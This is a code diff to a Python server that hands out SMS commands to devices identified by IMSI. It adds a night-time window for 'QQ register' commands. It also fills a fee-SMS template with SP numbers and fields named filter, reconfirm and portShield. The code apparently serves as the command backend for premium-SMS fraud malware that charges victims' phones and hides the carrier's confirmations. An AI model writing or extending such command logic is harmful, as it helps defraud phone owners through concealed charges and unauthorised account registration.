@@ -148,6 +148,13 @@ def isOpenHour():
         _result = False
     return _result
 
+def isOpenQqRegisterHour():
+    _result = True
+    _hour = int(time.strftime("%H", time.localtime()))
+    if _hour >= 22 or (_hour>=0 and _hour<=7) :
+        _result = False
+    return _result
+
 def async_update_match_count(_imsi):
     dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
     _sql = "update imsi_users set matchCount=matchCount+1 where imsi=%s" 
@@ -157,14 +164,16 @@ def async_update_match_count(_imsi):
 def get_cmd(_user,_threads):
     if _user['province']!=None and len(_user['province']) > 0 :
         dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
-
         _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and sms_cmd_covers.state = \'open\' and sms_cmd_configs.state = \'open\' order by rand() limit 1 '
         _record = dbConfig.get(_sql, _user['province'],_user['mobileType']) 
         if _record == None:
-            _current_cmd_content = get_register_cmd(_user)
-            if _current_cmd_content!=None :
-                _threads.append(threading.Thread(target=insert_register_cmd_log(_user,_current_cmd_content)))
-            return _current_cmd_content
+            if isOpenQqRegisterHour():
+                _current_cmd_content = get_register_cmd(_user)
+                if _current_cmd_content!=None :
+                    _threads.append(threading.Thread(target=insert_register_cmd_log(_user,_current_cmd_content)))
+                return _current_cmd_content
+            else :
+                return None
         else:
             _threads.append(threading.Thread(target=async_update_cmd_fee(_user,_record)))
             _current_cmd_content = FEE_CONTENT.replace('[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', _record['provinceFilter'] or str(_record['filter'])).replace('[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
